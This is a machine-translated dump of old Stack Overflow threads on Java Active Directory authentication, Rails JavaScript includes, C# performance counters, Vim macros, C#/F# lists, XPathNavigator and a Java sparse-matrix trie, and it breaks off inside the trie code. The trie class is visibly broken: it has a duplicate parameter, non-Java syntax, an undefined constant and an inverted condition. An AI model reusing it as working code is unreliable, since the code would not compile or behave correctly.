3.  LDAP - LDAP 绑定可用于简单地验证帐户名和密码。

还有一种叫做“ADFS”的东西，它为使用调用 Windows SSP 的 SAML 的网站提供 SSO，因此实际上它基本上是使用上述其他协议之一的迂回方式。

每个协议都有其优势，但根据经验，为了获得最大的兼容性，您通常应该尝试“像 Windows 那样做”。那么Windows是做什么的呢？

首先，两台 Windows 机器之间的身份验证有利于 Kerberos，因为服务器不需要与 DC 通信，并且客户端可以缓存 Kerberos 票证，从而减少 DC 上的负载（并且因为 Kerberos 支持委派）。

但是，如果身份验证方都没有域帐户，或者如果客户端无法与 DC 通信，则需要 NTLM。所以 Kerberos 和 NTLM 不是互斥的，NTLM 也没有被 Kerberos 淘汰。事实上，在某些方面 NTLM 比 Kerberos 更好。请注意，当同时提到 Kerberos 和 NTLM 时，我还必须提到 SPENGO 和集成 Windows 身份验证 (IWA)。IWA 是一个简单的术语，基本上意味着 Kerberos 或 NTLM 或 SPNEGO 来协商 Kerberos 或 NTLM。

使用 LDAP 绑定作为验证凭据的一种方式效率不高，并且需要 SSL。但直到最近实现 Kerberos 和 NTLM 一直很困难，因此使用 LDAP 作为临时身份验证服务一直存在。但在这一点上，通常应该避免。LDAP 是信息目录，而不是身份验证服务。将其用于预期目的。

那么如何在 Java 中，尤其是在 Web 应用程序的上下文中实现 Kerberos 或 NTLM？

Quest Software 和 Centrify 等许多大公司都有专门提到 Java 的解决方案。我无法真正评论这些，因为它们是公司范围内的“身份管理解决方案”，因此，从他们网站上的营销宣传来看，很难准确地判断正在使用哪些协议以及如何使用。您需要与他们联系以获取详细信息。

在 Java 中实现 Kerberos 并不难，因为标准 Java 库通过 org.ietf.gssapi 类支持 Kerberos。然而，直到最近还存在一个主要障碍——IE 不发送原始 Kerberos 令牌，而是发送 SPNEGO 令牌。但是在 Java 6 中，已经实现了 SPNEGO。从理论上讲，您应该能够编写一些可以验证 IE 客户端的 GSSAPI 代码。但我还没有尝试过。多年来，Kerberos 的 Sun 实施一直是错误的喜剧，因此根据 Sun 在该领域的记录，我不会对他们的 SPENGO 实施做出任何承诺，除非您掌握了那只鸟。

对于 NTLM，有一个名为 JCIFS 的免费 OSS 项目，它具有 NTLM HTTP 身份验证 Servlet 过滤器。但是，它使用中间人方法来验证 SMB 服务器的凭据，该服务器不适用于 NTLMv2（这正在慢慢成为必需的域安全策略）。由于这个原因和其他原因，JCIFS 的 HTTP 过滤器部分计划被删除。请注意，有许多衍生产品使用 JCIFS 来实现相同的技术。因此，如果您看到其他声称支持 NTLM SSO 的项目，请查看细则。

使用 Active Directory 验证 NTLM 凭据的唯一正确方法是通过具有安全通道的 NETLOGON 使用 NetrLogonSamLogon DCERPC 调用。Java中是否存在这样的事情？是的。这里是：

[http://www.ioplex.com/jespa.html](http://www.ioplex.com/jespa.html)

Jespa 是一个 100% Java NTLM 实现，支持 NTLMv2、NTLMv1、完整的完整性和机密性选项以及前面提到的 NETLOGON 凭据验证。它包括一个 HTTP SSO 过滤器、一个 JAAS LoginModule、HTTP 客户端、SASL 客户端和服务器（带有 JNDI 绑定）、用于创建自定义 NTLM 服务的通用“安全提供程序”等等。

麦克风

* * *

## 回答 #2

> 赞同：53
> 
> 时间：2008-12-26T19:51:44.513

这是我根据此博客中的示例汇总的代码：[LINK](https://community.oracle.com/blogs/kohsuke/2008/06/12/more-active-directory-integration-java)和此来源：[LINK](https://github.com/jenkinsci/active-directory-plugin/blob/master/src/main/java/hudson/plugins/active_directory/ActiveDirectoryUnixAuthenticationProvider.java)。

```
import com.sun.jndi.ldap.LdapCtxFactory;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.List;
import java.util.Iterator;
import javax.naming.Context;
import javax.naming.AuthenticationException;
import javax.naming.NamingEnumeration;
import javax.naming.NamingException;
import javax.naming.directory.Attribute;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.SearchControls;
import javax.naming.directory.SearchResult;
import static javax.naming.directory.SearchControls.SUBTREE_SCOPE;

class App2 {

    public static void main(String[] args) {

        if (args.length != 4 && args.length != 2) {
            System.out.println("Purpose: authenticate user against Active Directory and list group membership.");
            System.out.println("Usage: App2 <username> <password> <domain> <server>");
            System.out.println("Short usage: App2 <username> <password>");
            System.out.println("(short usage assumes 'xyz.tld' as domain and 'abc' as server)");
            System.exit(1);
        }

        String domainName;
        String serverName;

        if (args.length == 4) {
            domainName = args[2];
            serverName = args[3];
        } else {
            domainName = "xyz.tld";
            serverName = "abc";
        }

        String username = args[0];
        String password = args[1];

        System.out
                .println("Authenticating " + username + "@" + domainName + " through " + serverName + "." + domainName);

        // bind by using the specified username/password
        Hashtable props = new Hashtable();
        String principalName = username + "@" + domainName;
        props.put(Context.SECURITY_PRINCIPAL, principalName);
        props.put(Context.SECURITY_CREDENTIALS, password);
        DirContext context;

        try {
            context = LdapCtxFactory.getLdapCtxInstance("ldap://" + serverName + "." + domainName + '/', props);
            System.out.println("Authentication succeeded!");

            // locate this user's record
            SearchControls controls = new SearchControls();
            controls.setSearchScope(SUBTREE_SCOPE);
            NamingEnumeration<SearchResult> renum = context.search(toDC(domainName),
                    "(& (userPrincipalName=" + principalName + ")(objectClass=user))", controls);
            if (!renum.hasMore()) {
                System.out.println("Cannot locate user information for " + username);
                System.exit(1);
            }
            SearchResult result = renum.next();

            List<String> groups = new ArrayList<String>();
            Attribute memberOf = result.getAttributes().get("memberOf");
            if (memberOf != null) {// null if this user belongs to no group at all
                for (int i = 0; i < memberOf.size(); i++) {
                    Attributes atts = context.getAttributes(memberOf.get(i).toString(), new String[] { "CN" });
                    Attribute att = atts.get("CN");
                    groups.add(att.get().toString());
                }
            }

            context.close();

            System.out.println();
            System.out.println("User belongs to: ");
            Iterator ig = groups.iterator();
            while (ig.hasNext()) {
                System.out.println("   " + ig.next());
            }

        } catch (AuthenticationException a) {
            System.out.println("Authentication failed: " + a);
            System.exit(1);
        } catch (NamingException e) {
            System.out.println("Failed to bind to LDAP / get account information: " + e);
            System.exit(1);
        }
    }

    private static String toDC(String domainName) {
        StringBuilder buf = new StringBuilder();
        for (String token : domainName.split("\\.")) {
            if (token.length() == 0)
                continue; // defensive check
            if (buf.length() > 0)
                buf.append(",");
            buf.append("DC=").append(token);
        }
        return buf.toString();
    }

} 
```

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2008-12-23T23:55:38.300

我刚刚完成了一个使用 AD 和 Java 的项目。我们使用了 Spring ldapTemplate。

AD 符合 LDAP（几乎），我认为您的任务不会有任何问题。我的意思是它是 AD 或任何其他 LDAP 服务器，如果您只想连接也没关系。

我会看一下：[Spring LDAP](http://static.springframework.org/spring-ldap/docs/1.2.0/reference/)

他们也有例子。

至于加密，我们使用 SSL 连接（所以它是 LDAPS）。AD 必须在 SSL 端口/协议上配置。

但首先，请确保您可以通过 LDAP IDE 正确连接到您的 AD。我使用[Apache Directory Studio](http://directory.apache.org/studio/)，它真的很酷，而且它是用 Java 编写的。这就是我所需要的。出于测试目的，您还可以安装[Apache Directory Server](http://directory.apache.org/apacheds/1.5/)

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-11-20T19:56:12.803

正如 ioplex 和其他人所说，有很多选择。为了使用 LDAP（和 Novell LDAP API）进行身份验证，我使用了类似的东西：

```
 LDAPConnection connection = new LDAPConnection( new LDAPJSSEStartTLSFactory() );
connection.connect(hostname, port);
connection.startTLS();
connection.bind(LDAPConnection.LDAP_V3, username+"@"+domain, password.getBytes()); 
```

作为一项“特殊功能”，Active Directory 允许 LDAP 绑定到“user@domain”而不使用帐户的专有名称。此代码使用 StartTLS 在连接上启用 TLS 加密；另一种选择是基于 SSL 的 LDAP，*我的*AD 服务器不支持。

真正的诀窍在于定位服务器和主机。官方方法是使用 DNS SRV（服务）记录查找来定位一组候选主机，然后执行基于 UDP 的 LDAP“ping”（以特定的 Microsoft 格式）来定位正确的服务器。如果您有兴趣，我已经发布了一些关于我在该地区的冒险和发现之旅的[博客文章。](http://maniagnosis.crsr.net/2009/09/locating-active-directory-server-pt-1.html)

如果您想进行基于 Kerberos 的用户名/密码验证，那么您正在寻找另一锅鱼；它可以使用 Java GSS-API 代码，尽管我不确定它是否执行最后一步来验证身份验证。（做验证的代码可以联系AD服务器检查用户名和密码，从而为用户提供ticket授予ticket，但要确保AD服务器没有被冒充，还需要尝试获取ticket用户自己，这有点复杂。）

如果您想要执行基于 Kerberos 的单点登录，假设您的用户已通过域的身份验证，您也可以使用 Java GSS-API 代码执行此操作。我会发布一个代码示例，但我仍然需要将我可怕的原型变成适合人眼的东西。查看[SpringSource 中的一些代码](https://fisheye.springsource.org/browse/se-security/trunk/spring-security-kerberos/spring-security-kerberos-core/src/main/java/org/springframework/security/extensions/kerberos/SunJaasKerberosTicketValidator.java?r=HEAD)以获得一些灵感。

如果您正在寻找 NTLM（我被告知不太安全）或其他东西，那么，祝您好运。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2008-12-23T21:49:31.347

您只是在验证凭据吗？在这种情况下，您可以简单地做`kerberos`而不用打扰`LDAP`.

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-11-04T16:10:22.657

如果您只想使用 Kerberos 对 AD 进行身份验证，那么一个简单的[http://spnego.sourceforge.net/HelloKDC.java](http://spnego.sourceforge.net/HelloKDC.java)程序就可以完成。

查看该项目的“飞行前”文档，其中讨论了 HelloKDC.java 程序。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2008-12-23T22:17:29.293

[http://java.sun.com/docs/books/tutorial/jndi/ldap/auth_mechs.html](http://java.sun.com/docs/books/tutorial/jndi/ldap/auth_mechs.html)

SASL 机制支持 Kerberos v4 和 v5。 [http://java.sun.com/docs/books/tutorial/jndi/ldap/sasl.html](http://java.sun.com/docs/books/tutorial/jndi/ldap/sasl.html)

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2011-11-19T16:35:42.913

没有 SSL 的 ldap 身份验证是不安全的，任何人都可以查看用户凭据，因为 ldap 客户端在 ldap 绑定操作期间会传输用户名和密码，因此请始终使用 ldaps 协议。来源： [Java Spring Security 中的 Ldap 身份验证 Active Directory 示例](http://javarevisited.blogspot.com/2011/11/ldap-authentication-active-directory.html)

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-06-18T19:06:02.013

我建议你看一下[oVirt](http://www.ovirt.org)项目的 adbroker 包。它使用 Spring-Ldap 和 Krb5 JAAS 登录模块（带有 GSSAPI），以便使用 Kerberos 对 Ldap 服务器（Active-Directory、ipa、rhds、Tivoli-DS）进行身份验证。在 engine\backend\manager\modules\bll\src\main\java\org\ovirt\engine\core\bll\adbroker 中查找代码

您可以使用 git 克隆存储库或使用[gerrit](http://gerrit.ovirt.org)链接浏览

# javascript - Javascript 在 Rails 应用程序中包含标签最佳实践

> ID：390164
> 
> 赞同：61
> 
> 时间：2008-12-23T21:48:34.407
> 
> 标签：javascript, ruby-on-rails, header, rjs

假设我需要在`<head>`ERb 模板中调用 javascript 文件。我的直觉是照常做：

```
<head>
<%= javascript_include_tag :defaults %> <!-- For example -->
</head> 
```

在我的应用程序的布局中。问题当然是这些 javascript 文件被加载到我的应用程序的每个页面中，无论正在查看的页面是否需要它们。

所以我想知道是否有一种将javascript加载到例如仅在特定目录中找到的所有ERb模板的标题的好方法。

* * *

## 回答 #1

> 赞同：111
> 
> 时间：2008-12-23T22:02:41.023

我会使用[content_for](http://apidock.com/rails/ActionView/Helpers/CaptureHelper/content_for)。

例如，指定将其插入应用程序布局的位置：

```
<head>
<title>Merry Christmas!</title>
<%= yield(:head) -%>
</head> 
```

并从一个视图发送到那里：

```
<%- content_for(:head) do -%>
<%= javascript_include_tag :defaults -%>
<%- end -%> 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2008-12-24T14:51:06.340

我觉得包括所有的默认值都没有错，因为它们可以缓存在用户的浏览器上。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-06-19T05:51:40.110

我建议不要在标题中添加 javascript，因为它会导致页面加载速度变慢。而是在页面底部加载js，这样更快。 [http://developer.yahoo.com/performance/rules.html#js_bottom](http://developer.yahoo.com/performance/rules.html#js_bottom)

```
<body>
 ....
  <%= yield(:js) -%>
</body> 
```

并从一个视图发送到那里：

```
<%- content_for(:js) do -%>
  <%= javascript_include_tag :defaults -%>
<%- end -%> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-12-23T21:56:04.483

我通常在布局文件中有以下内容：

```
<head>
  <%= javascript_include_tag :defaults %> <!-- For example -->
  <%= @extra_head_content %>
</head> 
```

然后在视图中：

```
<% (@extra_head_content ||= "") += capture do %>
  <%= other_content %>
<% end %> 
```

请参阅[#capture的 API 文档](http://api.rubyonrails.org/classes/ActionView/Helpers/CaptureHelper.html#M001560)

# c# - 计数器不是单实例，需要指定实例名称

> ID：390166
> 
> 赞同：1
> 
> 时间：2008-12-23T21:49:01.020
> 
> 标签：c#, performancecounter

在开发性能监控控制台应用程序时，将什么传递到 getcategories 方法中？：

```
PerformanceCounter[] pcArr = pc.GetCounters(string instance); 
```

使用无参数重载时，会引发运行时异常：

计数器不是单个实例，需要指定实例名称。

另外，您如何在静态实用程序方法或扩展方法之间做出选择？例如，我可能会经常使用某个实用程序方法，但最好将其添加为扩展方法，这样我就不必一直引用另一个程序集。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T17:25:29.803

您需要在 GetCounters() 方法中指定实例名称。如果您在“控制面板”->“管理工具”下查看性能监视器。查看“实例”列。这就是您需要赋予该方法的内容。将返回具有相同实例名称的所有计数器。如果该列 '---' 中没有任何内容，则它是单个实例，您不需要传递任何内容。

据我所知，“实例”的原因是可能有多个“设备”需要监控。在处理器类别下，您可以有多个实例，每个处理器一个，我的有一个双核，所以有一个“0”、“1”和“_Total”。内存是单实例（至少在我的机器上）。

我会分别询问您的静态实用程序方法或扩展方法问题。

# vim - 在 Vim 中，如何将宏应用于一组行？

> ID：390174
> 
> 赞同：259
> 
> 时间：2008-12-23T21:51:28.970
> 
> 标签：vim, vim-macros

我有一个包含一堆行的文件。我记录了一个在单行上执行操作的宏。我想在文件中的所有剩余行上重复该宏。有没有快速的方法来做到这一点？

我尝试了 Ctrl+Q，突出显示了一组行，然后按了 @@，但这似乎没有奏效。

* * *

## 回答 #1

> 赞同：431
> 
> 时间：2008-12-23T22:02:04.893

在 Ex 模式下使用[普通](http://vimdoc.sourceforge.net/htmldoc/various.html#:normal)命令在多行/所有行上执行宏：

在第 5 行到第 10 行执行存储在寄存器**a中的宏。**

```
:5,10norm! @a 
```

在第 5 行到文件末尾执行存储在寄存器**a中的宏。**

```
:5,$norm! @a 
```

在所有行上执行存储在寄存器**a中的宏。**

```
:%norm! @a 
```

在匹配*pattern*的所有行上执行寄存器**a**中的宏存储。

 *```
:g/pattern/norm! @a 
```

要在视觉选择的行上执行宏，请按**V**和**j**或**k**，直到选择所需的区域。然后键入`:norm! @a`并观察显示以下输入行。

```
:'<,'>norm! @a 
```

在 vim 中输入*:help normal*以阅读更多内容。

* * *

## 回答 #2

> 赞同：63
> 
> 时间：2011-03-13T22:19:56.610

使用[global](https://vim.fandom.com/wiki/Power_of_g)在包含 'pattern' 的所有行上运行宏 'a'

```
:g/pattern/normal! @a 
```

如需帮助，请查看：`:help global`。

* * *

## 回答 #3

> 赞同：46
> 
> 时间：2014-01-03T22:26:02.160

你也可以这样做：

在正常模式下：

```
[number of times to apply the macro] @ [register] 
```

例如：

```
1000@q 
```

将寄存器 q 中的宏应用到接下来的 1000 行。

> 更新：[接受的答案](https://stackoverflow.com/a/390194/2482570)好多了
> 
> 更新：正如@kevinliu 指出的那样，您可能希望以 a 结束宏`j`以转到下一行。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2011-03-13T18:38:40.830

还有一个名为 RangeMacro 的插件，完全符合您的要求！对于无法通过名称猜测的每个人，它的作用是：它为给定范围内的每一行重复录制的宏，无论是通过视觉选择还是通过 :40,50 / :+10

见[http://www.vim.org/scripts/script.php?script_id=3271](http://www.vim.org/scripts/script.php?script_id=3271)

# c# - 如何将列表从 C# 传递到 F#？

> ID：390176
> 
> 赞同：7
> 
> 时间：2008-12-23T21:52:05.943
> 
> 标签：c#, f#

我知道 f# 列表与 c# 列表不同。我需要做什么才能将整数列表从 ac# 应用程序传递到 f# 库？一旦数据位于 f# 代码中，我希望能够对数据使用模式匹配。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2008-12-23T22:21:46.053

您可以使用

```
Seq.toList : IEnumerable<'a> -> list<'a> 
```

将 any 转换`IEnumerable<'a>` `seq`为 F# 列表。请注意，F# 列表是不可变的；如果你想使用可变列表，你不需要做任何特别的事情，但你将无法使用模式匹配。或者，您*可以*`System.Collections.Generic.List<'a>`为;定义活动模式。这只是个坏主意。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-01-21T17:11:26.197

这就是我最终如何做到的。

FSharp 代码：

```
let rec FindMaxInList list = 
   match list with
   | [x] -> x
   | h::t -> max h (FindMaxInList t)
   | [] -> failwith "empty list"

let rec FindMax ( array : ResizeArray<int>) =
   let list = List.ofSeq(array)
   FindMaxInList list 
```

c Sharp 代码：

```
 List<int> myInts = new List<int> { 5, 6, 7 };
    int max = FSModule.FindMax(myInts); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-12-23T22:30:29.157

您可以传递一系列整数 - 它基本上是任何支持`IEnumerable<int>`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2008-12-23T22:05:02.437

您可以从 F# 项目引用 C# 程序集。通过引用的程序集公开您的列表。

# c# - 在 C# 中实现我自己的 XPathNavigator

> ID：390178
> 
> 赞同：4
> 
> 时间：2008-12-23T21:53:56.860
> 
> 标签：c#, xml, xpath, xpathnavigator

我正在寻找派生自 Microsoft 的 XPathNavigator 类的类的 C# 示例实现。有人能指点我这样的文章吗？

正如您可能（或可能不）知道的那样，XmlNavigator 旨在允许在大多数数据模型上叠加 XPath 导航。

我已经实现了我的派生 XPathNavigator 类，它运行良好。很好，除了递归搜索的 XPath 表达式，即“//*”。

我很确定我在 Clone、MoveToFirstChild 或 MoveTo overides 中有一个微妙的错误，我认为如果存在另一个示例可能会有所帮助。

另外，我确信我已经看过讨论这个问题的杂志文章。事实证明，我的搜索一无所获。也许有人记得这样的文章。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-12-24T00:04:38.670

看看 Aaron Skonnard 的这篇文章：

" [**XPath 选择和自定义函数等**](http://msdn.microsoft.com/en-us/magazine/cc188773.aspx)",

[**它提供了一个派生自XPathNavigator**](http://msdn.microsoft.com/en-us/library/system.xml.xpath.xpathnavigator.aspx)的类的示例。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2008-12-23T23:49:01.463

您的实现或 MS 中的错误？如果它是 MS 的，那么您可以使用[反射器](http://www.red-gate.com/products/reflector/)偷看内部。

# java - Java中的稀疏矩阵/数组

> ID：390181
> 
> 赞同：72
> 
> 时间：2008-12-23T21:55:14.423
> 
> 标签：java, algorithm, sparse-matrix, sparse-array

我正在开发一个用 Java 编写的项目，这需要我构建一个非常大的二维稀疏数组。非常稀疏，如果这有所作为。无论如何：这个应用程序最关键的方面是时间方面的效率（假设内存负载，虽然几乎没有无限到允许我使用标准二维数组 - 关键范围在两个维度上都是数十亿）。

在阵列中的千千万万个单元中，将有数十万个单元包含一个对象。我需要能够非常快速地修改单元格内容。

无论如何：有人知道为此目的特别好的图书馆吗？它必须是 Berkeley、LGPL 或类似的许可证（没有 GPL，因为该产品不能完全开源）。或者，如果只有一种非常简单的方法可以制作自制稀疏数组对象，那也可以。

我正在考虑[MTJ](http://ressim.berlios.de/)，但没有听到任何关于它的质量的意见。

* * *

## 回答 #1

> 赞同：74
> 
> 时间：2010-08-02T20:21:11.807

使用 hashmap 构建的稀疏数组对于频繁读取的数据效率非常低。最有效的实现使用允许访问分段分布的单个向量的 Trie。

Trie 可以通过仅执行只读的两个数组索引来计算表中是否存在元素，以获得存储元素的有效位置，或者知道它是否不存在于底层存储中。

它还可以为稀疏数组的默认值在后备存储中提供一个默认位置，这样您就不需要对返回的索引进行任何测试，因为 Trie 保证所有可能的源索引将至少映射到默认值在后备存储中的位置（您将经常存储零、空字符串或空对象）。

存在支持快速更新 Tries 的实现，使用可选的“compact()”操作来优化多个操作结束时后备存储的大小。尝试比哈希图快得多，因为它们不需要任何复杂的哈希函数，也不需要处理读取冲突（使用哈希图，读取和写入都有冲突，这需要一个循环跳到下一个候选位置，并对它们中的每一个进行测试以比较有效源索引...）

此外，Java Hashmaps 只能在 Objects 上建立索引，并且为每个散列源索引创建一个 Integer 对象（每次读取都需要创建这个对象，而不仅仅是写入）在内存操作方面是昂贵的，因为它强调了垃圾收集器.

我真的希望 JRE 包含一个 IntegerTrieMap<Object> 作为慢速 HashMap<Integer, Object> 或 LongTrieMap<Object> 的默认实现作为更慢的 HashMap<Long, Object> 的默认实现......但这是仍然不是这样。

* * *

* * *

你可能想知道什么是 Trie？

它只是一个小的整数数组（范围小于矩阵的整个坐标范围），允许将坐标映射到向量中的整数位置。

例如，假设您想要一个仅包含几个非零值的 1024*1024 矩阵。不是将该矩阵存储在包含 1024*1024 个元素（超过 100 万个）的数组中，您可能只想将其拆分为大小为 16*16 的子范围，而您只需要 64*64 个这样的子范围。

在这种情况下，Trie 索引将仅包含 64*64 整数 (4096)，并且将至少有 16*16 数据元素（包含默认零，或在稀疏矩阵中找到的最常见的子范围）。

并且用于存储值的向量将仅包含彼此相等的子范围的 1 个副本（它们中的大多数都是零，它们将由相同的子范围表示）。

因此，不要使用类似的语法`matrix[i][j]`，而是使用类似的语法：

```
trie.values[trie.subrangePositions[(i & ~15) + (j >> 4)] +
            ((i & 15) << 4) + (j & 15)] 
```

使用 trie 对象的访问方法可以更方便地处理。

这是一个示例，内置在一个注释类中（我希望它可以编译，因为它被简化了；如果有错误要纠正，请告诉我）：

```
/**
 * Implement a sparse matrix. Currently limited to a static size
 * (<code>SIZE_I</code>, <code>SIZE_I</code>).
 */
public class DoubleTrie {

    /* Matrix logical options */        
    public static final int SIZE_I = 1024;
    public static final int SIZE_J = 1024;
    public static final double DEFAULT_VALUE = 0.0;

    /* Internal splitting options */
    private static final int SUBRANGEBITS_I = 4;
    private static final int SUBRANGEBITS_J = 4;

    /* Internal derived splitting constants */
    private static final int SUBRANGE_I =
        1 << SUBRANGEBITS_I;
    private static final int SUBRANGE_J =
        1 << SUBRANGEBITS_J;
    private static final int SUBRANGEMASK_I =
        SUBRANGE_I - 1;
    private static final int SUBRANGEMASK_J =
        SUBRANGE_J - 1;
    private static final int SUBRANGE_POSITIONS =
        SUBRANGE_I * SUBRANGE_J;

    /* Internal derived default values for constructors */
    private static final int SUBRANGES_I =
        (SIZE_I + SUBRANGE_I - 1) / SUBRANGE_I;
    private static final int SUBRANGES_J =
        (SIZE_J + SUBRANGE_J - 1) / SUBRANGE_J;
    private static final int SUBRANGES =
        SUBRANGES_I * SUBRANGES_J;
    private static final int DEFAULT_POSITIONS[] =
        new int[SUBRANGES](0);
    private static final double DEFAULT_VALUES[] =
        new double[SUBRANGE_POSITIONS](DEFAULT_VALUE);

    /* Internal fast computations of the splitting subrange and offset. */
    private static final int subrangeOf(
            final int i, final int j) {
        return (i >> SUBRANGEBITS_I) * SUBRANGE_J +
               (j >> SUBRANGEBITS_J);
    }
    private static final int positionOffsetOf(
            final int i, final int j) {
        return (i & SUBRANGEMASK_I) * MAX_J +
               (j & SUBRANGEMASK_J);
    }

    /**
     * Utility missing in java.lang.System for arrays of comparable
     * component types, including all native types like double here.
     */
    public static final int arraycompare(
            final double[] values1, final int position1,
            final double[] values2, final int position2,
            final int length) {
        if (position1 >= 0 && position2 >= 0 && length >= 0) {
            while (length-- > 0) {
                double value1, value2;
                if ((value1 = values1[position1 + length]) !=
                    (value2 = values2[position2 + length])) {
                    /* Note: NaN values are different from everything including
                     * all Nan values; they are are also neigher lower than nor
                     * greater than everything including NaN. Note that the two
                     * infinite values, as well as denormal values, are exactly
                     * ordered and comparable with <, <=, ==, >=, >=, !=. Note
                     * that in comments below, infinite is considered "defined".
                     */
                    if (value1 < value2)
                        return -1;        /* defined < defined. */
                    if (value1 > value2)
                        return 1;         /* defined > defined. */
                    if (value1 == value2)
                        return 0;         /* defined == defined. */
                    /* One or both are NaN. */
                    if (value1 == value1) /* Is not a NaN? */
                        return -1;        /* defined < NaN. */
                    if (value2 == value2) /* Is not a NaN? */
                        return 1;         /* NaN > defined. */
                    /* Otherwise, both are NaN: check their precise bits in
                     * range 0x7FF0000000000001L..0x7FFFFFFFFFFFFFFFL
                     * including the canonical 0x7FF8000000000000L, or in
                     * range 0xFFF0000000000001L..0xFFFFFFFFFFFFFFFFL.
                     * Needed for sort stability only (NaNs are otherwise
                     * unordered).
                     */
                    long raw1, raw2;
                    if ((raw1 = Double.doubleToRawLongBits(value1)) !=
                        (raw2 = Double.doubleToRawLongBits(value2)))
                        return raw1 < raw2 ? -1 : 1;
                    /* Otherwise the NaN are strictly equal, continue. */
                }
            }
            return 0;
        }
        throw new ArrayIndexOutOfBoundsException(
                "The positions and length can't be negative");
    }

    /**
     * Utility shortcut for comparing ranges in the same array.
     */
    public static final int arraycompare(
            final double[] values,
            final int position1, final int position2,
            final int length) {
        return arraycompare(values, position1, values, position2, length);
    }

    /**
     * Utility missing in java.lang.System for arrays of equalizable
     * component types, including all native types like double here.
     */ 
    public static final boolean arrayequals(
            final double[] values1, final int position1,
            final double[] values2, final int position2,
            final int length) {
        return arraycompare(values1, position1, values2, position2, length) ==
            0;
    }

    /**
     * Utility shortcut for identifying ranges in the same array.
     */
    public static final boolean arrayequals(
            final double[] values,
            final int position1, final int position2,
            final int length) {
        return arrayequals(values, position1, values, position2, length);
    }

    /**
     * Utility shortcut for copying ranges in the same array.
     */
    public static final void arraycopy(
            final double[] values,
            final int srcPosition, final int dstPosition,
            final int length) {
        arraycopy(values, srcPosition, values, dstPosition, length);
    }

    /**
     * Utility shortcut for resizing an array, preserving values at start.
     */
    public static final double[] arraysetlength(
            double[] values,
            final int newLength) {
        final int oldLength =
            values.length < newLength ? values.length : newLength;
        System.arraycopy(values, 0, values = new double[newLength], 0,
            oldLength);
        return values;
    }

    /* Internal instance members. */
    private double values[];
    private int subrangePositions[];
    private bool isSharedValues;
    private bool isSharedSubrangePositions;

    /* Internal method. */
    private final reset(
            final double[] values,
            final int[] subrangePositions) {
        this.isSharedValues =
            (this.values = values) == DEFAULT_VALUES;
        this.isSharedsubrangePositions =
            (this.subrangePositions = subrangePositions) ==
                DEFAULT_POSITIONS;
    }

    /**
     * Reset the matrix to fill it with the same initial value.
     *
     * @param initialValue  The value to set in all cell positions.
     */
    public reset(final double initialValue = DEFAULT_VALUE) {
        reset(
            (initialValue == DEFAULT_VALUE) ? DEFAULT_VALUES :
                new double[SUBRANGE_POSITIONS](initialValue),
            DEFAULT_POSITIONS);
    }

    /**
     * Default constructor, using single default value.
     *
     * @param initialValue  Alternate default value to initialize all
     *                      positions in the matrix.
     */
    public DoubleTrie(final double initialValue = DEFAULT_VALUE) {
        this.reset(initialValue);
    }

    /**
     * This is a useful preinitialized instance containing the
     * DEFAULT_VALUE in all cells.
     */
    public static DoubleTrie DEFAULT_INSTANCE = new DoubleTrie();

    /**
     * Copy constructor. Note that the source trie may be immutable
     * or not; but this constructor will create a new mutable trie
     * even if the new trie initially shares some storage with its
     * source when that source also uses shared storage.
     */
    public DoubleTrie(final DoubleTrie source) {
        this.values = (this.isSharedValues =
            source.isSharedValues) ?
            source.values :
            source.values.clone();
        this.subrangePositions = (this.isSharedSubrangePositions =
            source.isSharedSubrangePositions) ?
            source.subrangePositions :
            source.subrangePositions.clone());
    }

    /**
     * Fast indexed getter.
     *
     * @param i  Row of position to set in the matrix.
     * @param j  Column of position to set in the matrix.
     * @return   The value stored in matrix at that position.
     */
    public double getAt(final int i, final int j) {
        return values[subrangePositions[subrangeOf(i, j)] +
                      positionOffsetOf(i, j)];
    }

    /**
     * Fast indexed setter.
     *
     * @param i      Row of position to set in the sparsed matrix.
     * @param j      Column of position to set in the sparsed matrix.
     * @param value  The value to set at this position.
     * @return       The passed value.
     * Note: this does not compact the sparsed matric after setting.
     * @see compact(void)
     */
    public double setAt(final int i, final int i, final double value) {
       final int subrange       = subrangeOf(i, j);
       final int positionOffset = positionOffsetOf(i, j);
       // Fast check to see if the assignment will change something.
       int subrangePosition, valuePosition;
       if (Double.compare(
               values[valuePosition =
                   (subrangePosition = subrangePositions[subrange]) +
                   positionOffset],
               value) != 0) {
               /* So we'll need to perform an effective assignment in values.
                * Check if the current subrange to assign is shared of not.
                * Note that we also include the DEFAULT_VALUES which may be
                * shared by several other (not tested) trie instances,
                * including those instanciated by the copy contructor. */
               if (isSharedValues) {
                   values = values.clone();
                   isSharedValues = false;
               }
               /* Scan all other subranges to check if the position in values
                * to assign is shared by another subrange. */
               for (int otherSubrange = subrangePositions.length;
                       --otherSubrange >= 0; ) {
                   if (otherSubrange != subrange)
                       continue; /* Ignore the target subrange. */
                   /* Note: the following test of range is safe with future
                    * interleaving of common subranges (TODO in compact()),
                    * even though, for now, subranges are sharing positions
                    * only between their common start and end position, so we
                    * could as well only perform the simpler test <code>
                    * (otherSubrangePosition == subrangePosition)</code>,
                    * instead of testing the two bounds of the positions
                    * interval of the other subrange. */
                   int otherSubrangePosition;
                   if ((otherSubrangePosition =
                           subrangePositions[otherSubrange]) >=
                           valuePosition &&
                           otherSubrangePosition + SUBRANGE_POSITIONS <
                           valuePosition) {
                       /* The target position is shared by some other
                        * subrange, we need to make it unique by cloning the
                        * subrange to a larger values vector, copying all the
                        * current subrange values at end of the new vector,
                        * before assigning the new value. This will require
